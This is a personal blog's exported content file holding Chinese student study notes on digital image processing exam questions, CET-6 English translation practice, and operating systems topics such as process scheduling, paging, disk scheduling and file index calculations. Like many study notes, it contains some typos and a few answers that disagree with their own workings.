{"meta":{"title":"coronaPolvo Blog","subtitle":"","description":"","author":"coronaPolvo","url":"http://blog.keter.top","root":"/"},"pages":[{"title":"categories","date":"2021-05-04T01:50:48.701Z","updated":"2020-10-29T03:27:45.646Z","comments":true,"path":"categories/index.html","permalink":"http://blog.keter.top/categories/index.html","excerpt":"","text":""},{"title":"friends","date":"2021-05-04T01:50:48.700Z","updated":"2020-10-29T03:28:43.873Z","comments":true,"path":"friends/index.html","permalink":"http://blog.keter.top/friends/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-05-04T01:50:48.699Z","updated":"2020-10-29T03:28:23.733Z","comments":true,"path":"tags/index.html","permalink":"http://blog.keter.top/tags/index.html","excerpt":"","text":""},{"title":"player","date":"2021-09-11T03:17:25.642Z","updated":"2021-05-03T09:19:05.000Z","comments":true,"path":"player/index.html","permalink":"http://blog.keter.top/player/index.html","excerpt":"","text":""}],"posts":[{"title":"「数字图像处理」数字图像处理复习例题","slug":"「数字图像处理」数字图像处理复习例题","date":"2021-11-29T09:31:17.000Z","updated":"2021-11-30T12:10:09.309Z","comments":true,"path":"2021/11/29/「数字图像处理」数字图像处理复习例题/","link":"","permalink":"http://blog.keter.top/2021/11/29/%E3%80%8C%E6%95%B0%E5%AD%97%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E3%80%8D%E6%95%B0%E5%AD%97%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86%E5%A4%8D%E4%B9%A0%E4%BE%8B%E9%A2%98/","excerpt":"","text":"¶简答题例题 图像有哪几种存储格式？两种格式有什么区别？ 答：一共有点位图与矢量图两种存储格式； 点位图：图像由一个一个像素组成有如下特点： 不方便重复使用 色彩丰富 修改麻烦 放大有损失 矢量图：由代数方程式定义的线条或者曲线组成有如下特点： 可重复使用 色彩单调 放大无损失 修改简单 常用的客观图像质量评估方法有哪些？各有何特点？ 答：常用的客观图像质量评估方法有均方误差、信噪比与峰值信噪比和结构相似度三种方法 均方误差（MSE） 信噪比与峰值信噪比 结构相似度 下图为图像直方图，请比较A和B的明暗、C和D的对比度 答：A较暗，B较暗，C对比度较高、D对比度较低 如何让一个图像的对比度提高？ 答：可以通过直方图均衡化、线性拉伸、非线性拉伸的方法提高图像的对比度 请结合傅立叶的性质回答以下问题： （1）傅立叶的频谱图哪里是高频哪里是低频？ （2）为什么傅立叶变换得到的频谱图可以移频？ （3）一副图像去除高频或者低频后会怎么样？ （4）从傅立叶变换中你领悟到了什么？ （5）快速傅立叶变换运用了什么性质？能够进行快速计算有什么规律？ 答： （1） 内部是低频，外部是高频 （2） 因为傅立叶变换具有平移不变性 （3） 去除高频信息后图像的边缘和细节信息丢失，去除低频信息后可以消除图像中的随机噪声、削弱边缘效应，起到平滑图像的作用。去除低频信息后图像的边缘信息更加明显，轮廓更加清晰，但图像主体会变的模糊。 （4）傅立叶变换将一个波分解为多个简单正弦波的叠加。在日常处理事物时我们也可以将一件复杂的事情分解为多个小事情进行分析。 什么是伪彩色增强？伪彩色增强有哪几种方法？ 答：伪彩色增强是指将一个灰度级匹配到彩色空间上的一点，将单色图像映射为一副彩色图像的一种变换。 伪彩色增强主要有如下三种方法： （1）灰度分层法：把图像分割为若干个灰度区间，将每一个区间映射为某种色彩 （2）伪彩色变换：将每个像元的灰度值通过三个独立变换分别产生红、绿、蓝三个分量图像，然后将其合并为一幅彩色图像 （3）频率滤波：在不同的频率分量与颜色之间经过一定的变换建立一种对应关系 引起图像失真的原因 答： 镜头聚焦不准导致的散焦 相机与景物之间的相对运动 成像系统中存在的各种随机噪声 成像系统的像差，畸变等造成的图像失真 图像复原的步骤 答： 弄清退化原因 建立退化模型 反向推演 恢复图像 请描述Roberts、Prewitt、Sobel边缘算子的区别 答： Roberts算子：边缘定位准，但是对噪声敏感。适用于边缘明显且噪声较少的图像分割 Prewitt算子：对噪声有抑制作用，抑制噪声的原理通过像素平均，但是像素平均相当于图像低通滤波，所以Prewitt算子对边缘的定位不如Roberts算子 Sobel算子：Sobel算子和Prewitt算子都是加权平均，但是Sobel算子认为，领域的像素对当前像素产生的影响不是等价的，所以距离不同的像素具有不同的权，对算子结果产生的影响也不同。一般来说，距离越远，产生的影响越小。 Marr算子/高斯拉普拉斯算子的优点 答： Marr算子使用高斯模糊可以减少噪声，高斯拉普拉斯在Marr算子的基础上减少了计算次数。在图像有明显噪声时Marr算子/高斯拉普拉斯算子可以获得更好的效果。 请描述Canny边缘检测的过程 ​ 请分析下列滤波器是高通滤波器还是低通滤波器 H(u,v)=11+[D(u,v)/D0]2nH(u,v) = \\frac{1}{1+[D(u,v)/D_0]^{2n}} H(u,v)=1+[D(u,v)/D0​]2n1​ H(u,v)=eln(1/3)(D0D(u,v))H(u,v) = e^{ln(1/3)(\\frac{D_0}{D(u,v)})} H(u,v)=eln(1/3)(D(u,v)D0​​) 答： 对于公式（1），通过分析可以得到H(u,v)H(u,v)H(u,v) 随着D(u,v)D(u,v)D(u,v) 的增加而减小，大致变化曲线如下： 低频可以通过，高频不能通过，故这是一个低通滤波器 对于公式（2），通过分析可以得到H(u,v)H(u,v)H(u,v) 随着D(u,v)D(u,v)D(u,v) 的增加而增加，大致变化曲线如下： 低频不能通过，高频可以通过，故这是一个高频滤波器 ¶计算题例题 给定如下线性系统： {x1=2ei10tx2=3ei10tx3=4ei20t\\left\\{\\begin{array}{l} x_{1}=2 e^{i 10 t} \\\\ x_{2}=3 e^{i 10 t} \\\\ x_{3}=4 e^{i 20 t} \\end{array}\\right. ⎩⎪⎨⎪⎧​x1​=2ei10tx2​=3ei10tx3​=4ei20t​ y1=10ei10t+13y_1 = 10 e^{i10t+\\frac{1}{3}}y1​=10ei10t+31​请求解y2y_2y2​、y3y_3y3​ 解：由题意可抽象出y的表达式：y=5e13xy = 5e^{\\frac{1}{3}}xy=5e31​x 可以得到：y2=15e10t+13y_2 = 15e^{10t+\\frac{1}{3}}y2​=15e10t+31​ 由于线性系统不改变频率，改变了频率的输入无法求解 故y3y_3y3​ 无法进行求解。 对一副图像进行如下分段线性点运算： 请分析写出每一段经过变换后图像会产生什么样的变化 答：第一段中截距b=0，斜率小于1会让图像变的更暗 第二段中斜率大于0会让图像变的更加的亮 第三段中斜率小于0会让图像边的更加的暗 一幅图像共有8个灰度级，每一灰度级概率分布如下表所示，要求对其进行直方图均衡化处理，并画出均衡化后的图像的直方图。 答： 第一步：求变换函数计算各灰度级 s0=0.29s_0 = 0.29s0​=0.29 s1=0.29+0.24=0.53s_1 = 0.29+0.24 = 0.53s1​=0.29+0.24=0.53 s2=0.29+0.24+0.17=0.70s_2 = 0.29+0.24+0.17 = 0.70s2​=0.29+0.24+0.17=0.70 s3=0.29+0.24+0.17+0.12=0.82s_3 = 0.29+0.24+0.17+0.12 = 0.82s3​=0.29+0.24+0.17+0.12=0.82 s4=0.29+0.24+0.17+0.12+0.09=0.91s_4 = 0.29+0.24+0.17+0.12+0.09= 0.91s4​=0.29+0.24+0.17+0.12+0.09=0.91 s5=0.29+0.24+0.17+0.12+0.09+0.06=0.97s_5 = 0.29+0.24+0.17+0.12+0.09+0.06= 0.97s5​=0.29+0.24+0.17+0.12+0.09+0.06=0.97 s6=0.29+0.24+0.17+0.12+0.09+0.06+0.02=0.99s_6 = 0.29+0.24+0.17+0.12+0.09+0.06+0.02= 0.99s6​=0.29+0.24+0.17+0.12+0.09+0.06+0.02=0.99 s7=0.29+0.24+0.17+0.12+0.09+0.06+0.02+0.01=1s_7 = 0.29+0.24+0.17+0.12+0.09+0.06+0.02+0.01= 1s7​=0.29+0.24+0.17+0.12+0.09+0.06+0.02+0.01=1 第二步：计算均衡后的灰度级 . 第三步：计算Ps(sk)P_s(s_k)Ps​(sk​) r0=0r_0=0r0​=0映射到s0=2/7s_0=2/7s0​=2/7， Ps(s0)=0.29P_s(s_0)=0.29Ps​(s0​)=0.29 r1=1/7r_1=1/7r1​=1/7映射到s1=4/7s_1=4/7s1​=4/7 ，Ps(s1)=0.24Ps(s_1)=0.24Ps(s1​)=0.24 r2=2/7r_2=2/7r2​=2/7映射到s2=5/7s_2=5/7s2​=5/7 ，$ Ps(s_2)=0.17 r_3、 r_4映射到映射到映射到s_3=6/7$， Ps(s3)=0.12+0.09=0.21Ps(s_3)=0.12+0.09=0.21Ps(s3​)=0.12+0.09=0.21 r5、r6、r7r_5、 r_6、 r_7r5​、r6​、r7​映射到s4=1s_4=1s4​=1 ，Ps(s4)=0.06+0.02+0.01=0.09P_s(s_4)=0.06+0.02+0.01=0.09Ps​(s4​)=0.06+0.02+0.01=0.09 如下图所示为原始图像数据，对该图像采用3×3模板进行中值滤波。 解： ¶考点说明 一些老师明确说不考的点： 第一章不考 图像放缩只考整数倍的放缩 小波变换不考 直方图规定化不考 图像的代数运算（加、减）","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"数字图像处理","slug":"课程学习/数字图像处理","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E6%95%B0%E5%AD%97%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"}],"tags":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/tags/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"数字图像处理","slug":"数字图像处理","permalink":"http://blog.keter.top/tags/%E6%95%B0%E5%AD%97%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"}]},{"title":"「六级」六级翻译笔记","slug":"「六级」六级翻译笔记","date":"2021-11-28T09:38:40.000Z","updated":"2021-11-28T10:07:35.423Z","comments":true,"path":"2021/11/28/「六级」六级翻译笔记/","link":"","permalink":"http://blog.keter.top/2021/11/28/%E3%80%8C%E5%85%AD%E7%BA%A7%E3%80%8D%E5%85%AD%E7%BA%A7%E7%BF%BB%E8%AF%91%E7%AC%94%E8%AE%B0/","excerpt":"","text":"¶第一套 ¶翻译部分 ​ 青藏铁路是世界上最高最长的高原铁路,全长1956公里,其中有960公里在海拔4000多 米之上,是连接西彍和中国其他地区的第一条铁路。由于铁路穿越世界上最脆弱的生态系统,在 建设期间和建成后都采取了生态保护措施,以确保其成为一条“録色铁路”。青藏铁路大大缩 短了中国内地与西藏之间的旅行时间。更重要的是,它极大地促进了西藏的经济发展,改善了 当地居民的生活。铁路开通后,愈来愈多的人选择乘火车前往西疲,这样还有机会欣赏沿线的美景。 1、找主干（谁是什么， 谁做什么， 什么被做） Qing Zang railway is the railway of highest altitude in the world. 2、添枝加叶（添加修饰成分） Qing Zang railway is the longest railway of highest altitude in the world,with a total length of 1956km, 960km of which are over the altitude of 4000 meters. 青藏铁路是世界上最高最长的高原铁路,全长1956公里,其中有960公里在海拔4000多米之上。 With： 伴随拥有（“有”的一个翻译方式） It is the first railway that connected Tibet to other areas in China. 它是连接西彍和中国其他地区的第一条铁路。 前后主语一致的时候 用it或者they来代替 的： 修饰成分长用定语从句（有动词） 直接用形容词 3、简答回读 检查有没有错的地方 Most fragile ecosystem Due to the railway spread across the most fragile ecosystem in the world, during and after construction,eco-protected measures taken to ensure it becomses a green railway. 由于铁路穿越世界上最脆弱的生态系统,在 建设期间和建成后都采取了生态保护措施,以确保其成为一条“録色铁路”。 Due to 一般接坏的原因 了：完成时态的标志 缺少主语的时候： 添加主语（We、People） 用被动语态 青藏铁路大大缩 短了中国内地与西藏之间的旅行时间。更重要的是,它极大地促进了西藏的经济发展,改善了 当地居民的生活。 Qing zang railway has reduced the traveing time between Chinese mainland and Tibet. What’s more import is that it has greatly improved the echoic development and has enhanced the life quality of local residents. 的：A of B ，A B 都是名词就翻译成B的A； After the railway was opened, more and more people choose to go to Tibet by train. This way they have chance to enjoy the beautiful scenes along the road. There are opportunities for tem to enjoy the beautiful view along the way. 这样还有机会欣赏沿线的 美景。 “有” 的三种翻译方式： have has There be with ¶翻译总结 ¶单词/词组 altitude：高度 Qing Zang railway is the railway of highest altitude in the world. of which: 其中 [ 960km of which are over the altitude of 4000 meters ] fragile ecosystem: 生态系统 Due to the railway spread across the most fragile ecosystem in the world, during and after construction,eco-protected measures taken to ensure it becomses a green railway. Chinese mainland: 中国大陆 Beautiful scenes: 美丽的风景 Enhance the ecornic development: 促进经济发展 Enhanced the life quality: 加强生活质量 Local residents: 当地居民 ¶翻译技巧 使用with翻译“的”, 加一个逗号加在句尾 Qing Zang railway is the longest railway of highest altitude in the world,with a total length of 1956km, 960km of which are over the altitude of 4000 meters. ¶第二套 ¶翻译部分 港珠澳大桥( Hong Kong- Zhuhai- Macau Bridge) 全长55公里,是我国一项不同寻常的工程壮举。大桥将三个城市连接起来,是世界上最长的跨海桥梁和隧道系统。大桥 将三个城市之间的旅行时间从3小时缩短到30分钟。这座跨度巨大的钢筋混凝土 大桥充分证明中国有能力建造创纪录的巨型建筑。它将助推区域一体化,促进经济 增长。大桥是中国发展自己的大湾区总体规划的关键。中国希望将大湾区建成在技 术创新和经济繁荣上能与旧金山、组约和东京的湾区相媲美的地区。 [ Hong Kong-Zhuhai-Macau Bridge, with a total length of 55km, is an unusual Engineering in our country. ] Hong Kong-Zhuhai-Macau Bridge is an unusural extraordinary engineering achievement in China ,with a total length of 55km. 港珠澳大桥( Hong Kong-Zhuhai-Macau Bridge)全长55公里,是我国一项不同寻常的工程壮举。 “的” 的三种翻译方式： of 如果of前后都是名词 A of B 形容词 修饰成分长用从句/有动词 [ The bridge which is the longest sea bridge and tunnel system connected the there cities together. ] The big bridge has connected the three cities together and it is the longest bridge and tunnel system which crossed the sea in the world. 大桥将三个城市连接起来,是世界上最长的跨海桥梁和隧道系统。 [ It reduced the triveing time between the three cities from 3 hours to 30 minutes. ] The big bridge has reduced trivelling time among these three cities from 3 hours to 30 minutes. 大桥 将三个城市之间的旅行时间从3小时缩短到30分钟。 [ This long span bridge proved that China has the ability to build huge architecture which can break the record. ] With large span this big bridge that were made of steel and concrete has proved that China has the ability to build huge building that create records. 这座跨度巨大的钢筋混凝土大桥充分证明中国有能力建造创纪录的巨型建筑。 It will be helpful for prompting region integration and enhancing the echoic growth. 它将助推区域一体化,促进经济增长。 The big bridge is the main point for China to develop its own general plan in the Da Wan area. 大桥是中国发展自己的大湾区总体规划的关键。 China hopes to make the Da Wan area a prosperous area which can match San Francisco, New York and Tokyo in the aspects of technology innovation and economy prosperity. 中国希望将大湾区建成在技术创新和经济繁荣上能与旧金山、组约和东京的湾区相媲美的地区。 ¶翻译总结 ¶单词/词组 extraordinary achievement：壮举 The big bridge has connected the three cities together and it is the longest bridge and tunnel system which crossed the sea in the world. concrete：混泥土 With large span this big bridge that were made of steel and concrete has proved that China has the ability to build huge building that create records. among … : 在多者之间 The big bridge has reduced trivelling time among these three cities from 3 hours to 30 minutes. ¶第三套 ¶翻译部分 ​ 北京大兴国际机场位于天安门广场以南46公里处,于2019年9月30日投入使 用。该巨型工程于2014年开工建设,高峰时工地上有4万多工人。航站楼设计紧湊, 可以允许最大数量的飞机直接停靠在最靠近航站楼中心的位置,这给乘客提供了极 大的方便。航站楼共有82个登机口,但乘客通过安检后,只需不到8分钟就能抵达 任何一个登机口。机场的设计可确保每小时300架次起降。机场年客运量2040年将 达到1亿人次,有望成为世界上最繁忙的机场。 Located in 46km south from the Tiananmen square Beijing DaXing International Airport was put into operation on September 30th 2019. 北京大兴国际机场位于天安门广场以南46公里处,于2019年9月30日投入使用。 The construction of this mega project stared in 2014 with fourth thousand workers on its site at its peek. The construction of this mega project stared in 2014. There were 40,000 workers on its peek. 该巨型工程于2014年开工建设,高峰时工地上有4万多工人。 With the compact design the terminal allows the maximun number of airplane to park in the area nearest to the center of the terminal, which has provided great convenience to the passengers. The terminal allows the airplane. The terminal allows the airplane to part in the area nearest the center of the terminal. The terminal allows the maximun number of airplane to part in the area nearest the center of the terminal, which has provided great convenience to the passengers. With the compact design the terminal allows the airplane to part in the area nearest the center of the terminal, which has provided great convenience to the passengers. 航站楼设计紧湊, 可以允许最大数量的飞机直接停靠在最靠近航站楼中心的位置,这给乘客提供了极大的方便。 There are 82 boarding gates in the terminal. However the passenage can arrive any of them within 8 minutes after security check. 航站楼共有82个登机口,但乘客通过安检后,只需不到8分钟就能抵达任何一个登机口。 The design of the airport can ensure 300 takeoffs and landings per hour. 机场的设计可确保每小时300架次起降。 The number of annual passenages in this airport is goint to reach 100 millon by 2004 . It is expected to become the busiest airport in the world. 机场年客运量2040年将达到1亿人次, 有望成为世界上最繁忙的机场。 ¶翻译总结","categories":[],"tags":[]},{"title":"「操作系统」操作系统笔记","slug":"「操作系统」操作系统笔记","date":"2021-11-28T03:46:14.000Z","updated":"2021-11-30T10:16:46.249Z","comments":true,"path":"2021/11/28/「操作系统」操作系统笔记/","link":"","permalink":"http://blog.keter.top/2021/11/28/%E3%80%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%8D%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/","excerpt":"","text":"¶第二章处理器调度作业 ¶基本概念 分时操作系统: 使一台計算機採用時間片輪轉的方式同時為幾個、幾十個甚至幾百個用户服务的一种操作系統。 分时操作系统的特点：多路性；独立性；及时性；交互性 实时操作系统：它会按照排序执行、管理系统资源，并为开发应用程序提供一致的基础。 实时操作系统的特点： 多任务 有线程优先级 多种中断级别 ¶进程的状态转换 我们需要掌握的进程状态有： 创建态 就绪态 运行态 阻塞态 终止态 需要掌握状态的转化关系： 例题：请填空 解： 例题：在一单处理器系统中若 有5个用户进程在非管态的某一时刻处于运行状态的用户进程最多有填空1个,最 少有[填空2]个处于就绪状 态的用户进程最多有[填空3 个处于等待状态的用户进程 最多有[填空4]个在想从科协退休之后去哪里坐 答案：1;0;4;5 ¶进程调度算法 非交互系统的策略 先到先得算法（FCFS First Come First Server） 短作业优先算法（SPF Shortest Process First） 高响应比优先算法（HRRN） 响应比=等待时间+作业处理时间作业处理时间响应比 = \\frac{等待时间+作业处理时间}{作业处理时间} 响应比=作业处理时间等待时间+作业处理时间​ 交互系统的策略 时间片轮转算法 优先级调度算法 例题：在某个计算机系统中有一台输入机和一台打印机,现有两道程序投 入运行,且程序A先开始运行,程序B后开始运行。程序A的运行轨迹为:计算50ms、打印100Ms,再计算 50Ms,打印100Ms,结束。程序B的运行轨迹为:计算50Ms、输入 80ms,再计算100Ms,结束。试说明 (1)两道程序运行时,cpu是否存 在空闲等待? 若是,求出等待的时间长短(单位ms)。 (2)程序A、B哪个有等待cpu的情况? 若有,求出等待的时间长短。 解： 17有三个作业A、B、C,它们分别单独运行时的CPU和I/O占用时间如下图所示: 现在请考虑三个作业同时开始执行。系统中的资源有一个CPU和两台输入/输出设备(I/O1和I/O2)同时运行。三个作业的优先级为A最高,B次之,C最低,旦低优先级的进程开始占用CPU,则高优先级进程也要等待 其结束方可占用CPU。请问 最早结束的作业是[填空1 最后结束的作业是[填空2]? 计算这段时间CPU的利用率。(三个作业全部结束为止,精确 到两位小数)[填空3]? 答：B;A;85.70; 例题：在单CPU和两台IO(I,I2)设备的多道程序设计环境下,同时投入三个作业运行。它们的执行轨迹如下: Jobl: 12(30ms), CPU(10ms) 1(30ms)、CPU(1Oms); Job2: Il(20ms)、CPU(20ms)、2(40ms); Job3: CPU(30ms), II(20ms) 如果CPU、I1和I2都能并行工作,优先级从高到低为Job1、Job2和Job3, 优先级高的作业可以抢占优先级低的作业的CPU。试求: (1) 每个作业从投入到完成分别 所需的时间。Job1是多少? Job2是多少? 空21Job3是多少? 填空3](单位ms) (2) 设备利用率。Il是多少?I2是多少? (精确到小数后一位) 解： 例题：有5个进程P1,P2,P3,P4,P5依次且同时到达就绪队列,它们的优先数和需要的处理器时间 如下表所示。(数字越大,优先 级越高) 忽略进程调度等所花费的时间,请 回答下列问题 (1)写出分别采用“先来先服务” 和“非抢占式的优先数”调度算法 时选中进程执行的次序。(按调度次序填写进程,如P1P223P4P5,中间无需间 隔)先来先服务:[填空1]; 非抢占式的优先数:「填空2] (2)分别计算出在两种算法下各进程在就绪队列中的平均等待时间 先来先服务:「填空3]; 非抢占式的优先数:「填空4] 例题：有一个具有两道作业的批处理系统, 作业调度采用短作业优先的调度算法,进程 调度采用以优先数为基础的抢占式调度算法 如下表所示的作业序列,作业优先数即为进程优先数,优先数越小优先级越小。 1)请完成下表的1-22的填空(周转时间取整数, 带权周转时间精确到小数点后1位)。 例题：假设某多道程序设计系统中有供用户使用的内存100K.打印机1台。系统采用可变分区方式管理内存对打印机采用静态分配并假设输入输出操作的时间忽略不计;采用最短剩余时间优先的进程调度算法,进程剩余执行时间相同时采用先来先服务算法;进 程调度时机选择在执行进程结束时或有新进程到达时。现有一进程序列如下假设系统优先分配内存的低地址区域,且不许移动己在主存中的进程,请: (1)给出进程调度算法选中进程的次序[填空1]。(按调度次序填写进程号,中 间无需间隔符,如12345) (2)全部进程执行结束所用的时间是多少? 答案：12345，47 ¶第三章 内存 ¶内存地址分配算法 最先适应算法 ​ 通俗来讲就是：把进程尽量往低地址空闲区域放，放不下的话在更加地址慢慢升高。每一次存放，都从最低地址开始寻找满足的空闲区域，直至最高地址。即每次存放都从0开始。 下次适应算法 ​ 该算法是在FF算法的基础上进行改进的，大体上与FF算法相似，而不同点就是： FF算法每次存储都是从0开始寻找符合要求的空闲区域； NF算法每次存储都是接着上次分配区域的下一个地址； 最佳适应算法 ​ 该算法和FF算法相似，每当进程申请空间的时候，系统都是从头部开始查找。空闲区域是从小到大记录的，每次查找都从最小的开始，直到查找的满足要求的最小空闲区域。 最坏适应算法 ​ 该算法与BF算法相反，BF是用最小的空闲区域来存储东西，而WF是用最大的空闲区域来存储。 例题：给定主存空闲分区,按地址从小到大为:100KB、500KB、 200KB、30KB和600KB,编号分另为1-5。现有用户进程依次分别为 212KB、417KB、112KB和426KB: (1)分别采用最先适应、最优适应 、最坏适应算法和下次适应算法将它们装入到主存的那个分区? 答： ¶页式存储 ¶页面置换算法 页面置换算法： 最佳置换算法（OPT） 先进先出算法（FIFO） 最近最久未使用算法（LRU） 选择最近最长时间未访问过的页面予以淘汰，它认为过去一段时间内未访问过的页面，在最近的将来可能也不会被访问。 时钟置换算法（Clock） 例题：一个请求页式存储管理系统使用IFO、OPT和LRU页面置换 算法,如果一个作业的页面走向为： （1）2、3、2、1、5、2、4、5、3、2、5、2 当分配给该作业的物理块数分别为M=3和M=4时,试计算访问过程中发生的缺页中断次数F。 答案：9;6;7;6;5;6 例题：在一个请求分页式系统中 假如一个作业共有5个页面, 其页面调度次序为:1,4,3, 1,2,5,1,4,2,1,4,5。 若分配给改作业的主存块数为 3,分别采用 FIFO、LRU、Clock页面置换算法,试计算 访问过程中所发生的缺页中断 次数和缺页中断率。(保留小数点后1位) 答：9；75.0；8；66.7；9；75.0 例题：一个程序要将100×100数 组置初值0。现假设分配给该 程序的主存块数有三块,程序 固定占用一块,页面的大小为 每页100个字,数组中每一行 元素存放在一页中。开始时, 第一页数据已经调入主存。若 采用 FIFO算法,则下列两种对数组的初始化程序段引起缺页 中断次数各是多少? . 答案：9999；99 ¶根据页表结构进行计算 ​ 熟悉一级二级页表的结构掌握如下计算知识点： 逻辑地址与物理地址的转换 ​ 物理地址 = 页面始址+页内偏移量 ​ 页号 = 逻辑地址 // 页面长度 ​ 页内偏移量 = 逻辑地址%页面长度 根据逻辑地址结构计算页表的大小、页表最大占用 数据访问时间 计算访问了几次内存 例题：某计算机主存按字节编址,逻辑地址和物理地址都是32位, 页表项大小为4字节。请回答下列问题。若使用一级页表的分页存储管理方式,逻辑地址结构为： (1)页的大小是多少KB? (2)页表最大占用多少MB? 答案：4；4 例题：某系统采用二级页表的分页存 储管理方式,系统按字节编址 虚拟地址格式为: 页目录号(10位)|页表索引(10位) 页内位移(12位) 请问: 1.页框的大小为多少KB？进程的虚拟地址空间大小为多少K个页面? 2.若页目录表项和页表项均占4B,则一个进程的页目录表和页表共占多少页? 3.若某指令周期内访问的虚地址是01000000H和01112048H,则进行地址转换时共访问了多少个二级页表？ 答案：4;1024;25;1 例题：在页式存储管理系統中,页面大小为2048个字节,将一个由4个页面(页号为0-3组成的程序装入内存中,该 进程的页表如下表所示： 对于下面的逻辑地址,请按西表过算出对应的(物理地)给逻辑地转换的过程： (1)4000(十进制) (2)2019H(十六进制) . 例题：假定某采用分页式存储管理的系统中,主存容量为1MB,被分成256块,块号为0,1,2,…255。某作业的地址空间占4页,其页号为0,1,2,3,被分配到主存的第2,4,1,5块中。请问: (1)主存地址应该用多少位来表示? (2)作业每一页的长度为多少? 逻辑地址中的页内地址(单元号)应该用多少位来表示? (3)把作业中每一页分到的主存块中的起始地址填入下表。 . . 例题：某一页式存储管理系统，假设其页面全部存储在内存当中。 若访问内存的时间为120ns，那么访问一个数据的时间是多少？ 若增加一个块表，无论命中与否均需要20ns的开销，假设快表的命中率为80%，则此时访问一个数据的时间是多少？ . 例题：在页式虚拟存储管理系统中，用户编程空间为32个页，页面大小为1KB，内存空间为16KB。如果应用程序有10页长，且已知页号为0-3的页已依次分得页框号为4、7、8、10的页框，尝试把逻辑地址0AC5H和1AC5H转化为对应的物理地址。 . ¶段式存储 例题：给定段表如下图,给定地 址为段号和位移数,试求出对应的主存物理地址,(如越界则填越界中断)。 答案：649;1727;2301 ¶第四章 设备管理 ¶硬盘调度算法 先来先服务算法（FIFO） 最短寻道优先算法（SSTF） ​ 优先处理与当前磁道最近的 电梯算法 ​ 从头扫描到最后一个柱面再返回 扫描算法（SCAN） ​ 不管最后柱面的位置，到达末尾后再回来（不撞南墙不回头类型） LOCK调度算法 循环扫描调度算法 例题：假设磁盘存取臂目前出于8号柱面上,刚刚访问了6号柱面,对应以下的请求访 问序列: 9,7,15,18,20, 3,则按照SCAN算法和电梯算法,计算上述两种算法中磁头的移动距离。(设柱面号为0-99) SCAN填空1] 电梯调度算法 [填空2] 答案：187；29 例题：磁头的当前位置为100磁 道,磁头正向磁道号增加的方向移动。现有一磁盘读写 请求队列:23,376,205,132.19,61.190, 398 29,4,18,40。若采用先来先服务、最短寻道时间优 先和扫描算法,试计算出各 种算法中移臂所经过的柱面： (1) 先来先服务算法[填空 1] (2) 最短寻道时间优先[填空2] (3) 扫描算法[填空3] 答案：1596; 700; 692 如磁盘的每个磁道分成9个块现有一文件共有A、B、… 共9个记录,每个记录的大小与块的大小相等,设磁 盘转速为27ms/转,每读出 块后需要2ms的处理时间。 若忽略其他辅助时间,试问 1)如果顺序存放这些记录并顺序读取, 处理该文件要多少ms？ 2)如果要顺序读取该文件, 记录如何存放处理时间最短ms？ 答案：245；53 解析：对于第一道题需要注意在2ms的处理时间中磁道还是在继续行走的，并不是停下来的。对于第二题每次都寻找与当前磁头最近的即可。 ¶第五章 文件管理 ¶文件结构相关计算 例题： 设有一个包含1000个记录的索引文件,每个记录正好占用一个物理块, 而一个物理块 可以存放10个索引表目。建立索引时,一个物理块应有一个索引表目(即:无直接地址项)。 该文件至少应该建立(填空1) 级索引? 索引应占(填空2)个物理块? 该文件总共占用多少([填空3]) 物理块 ? 答案：3；111；1111 例题：设某文件为链接文件由5个逻辑记录组成,每个逻辑记录的大小与磁盘块大小相等,均为512字节,并依次存放在50、121、75、 80、63号磁盘块上。若要存取文件的第1569逻辑字节处 的信息, 问要访问哪一个磁盘块?[填空],该磁盘块第几个字节?[填空2] 答案：80；33 1569/512得到商为:3, 余数为:33。所以,访问的是 80磁盘块的第33个字节。 例题： 【2018统考真题】某文件系统采用索引结点存放文件的属性和地址信息, 蔟大小为4KB。每个文件索引结点占64B, 有11个地址项, 其中直接地址项8个, 一级二级和三级间接地址项各1个,每个地址项长度为4B。请回答下列问题： 问题1: 该文件系统能支持的最大文件长度是多少?「填空1]KB+[填空2]MB+[填空3]GB+[填空4]TB 问题2: 文件系统用1M(1M=2^20)个簇存放文件索引结点, 用512M个簇存放文件数据。若一个图像文件的大小为5600B,则该文件系统最多能存放多少填空M个这样的图像文件？ 问题3: 若文件F1的大小为6KB, 文件F2的大小为40KB,则该文系统获取F1和F2最后一个蔟的族号需要的时间是否相同？ 答案：32；4；4；4；64；不同 解析： 问题一：直接地址项可以存储：4KB * 8 = 32KB 每个簇能够存储的地址项有4KB/4B = 1024个 一级地址可以存储：1024 * 4KB = 4MB 二级地址可以存储：1024 * 4MB = 4GB 三级地址可以存储：1024 * 4GB = 4TB 问题二：1M个簇可以存放：1M * 4KB / 64B = 64M个文件索引节点 一个图像5600B占两个簇，对于512M个簇来说最多可以存放512M/2 = 256M个簇，但是文件系统中只有64M个文件索引文件，所以最多只能存储64M这样的图像文件。 问题三：直接地址项能够存储32KB，由于F1的大小只有6KB所以文件可以直接从直接地址中读出，F2的大小32KB需要从一级索引去读取。故两个文件的读取时间不一样。 例题如果一个索引节点为128B, 指针长4B, 状态信息占用68B, 而每块大小为8KB问在索引节点中有多大空间给指针?使用直接、一次间接、二次间接和三次间接指针分别可表示多大的文件? (1)直接指针表示多少B？ (2)一次间接指针表示多少MB？ (3)二次间接指针表示多少GB? (4)三次间接指针表示多少TB? 答案：98304;16;8;16 解析：索引节点为128B，状态信息占用68B，留给指针的有128B-68B=60B的大小。一个索引块中一共有60/4 = 15 个指针。一级指针有15-3 = 12个；12 * 8KB = 96KB = 98304B 一块中可以存储8KB/4B = 2048个盘块指针，一次间接指针可以表示2048*8KB = 16MB 二次间接指针可以存储：2048 * 2048 * 8KB = 2048 * 16MB = 32GB 三次间接指针可以存储：2048 * 32GB = 64TB 例题：某文件系统中, 每块大小为2KB, 每块地址用4B表示, 地址结构采用UINX系统方案,即:10个直接地址(addr[0]~addr[9]) 一级索引(addr[10])、二级索引 (addr[11]和三级索引(addr[12]) 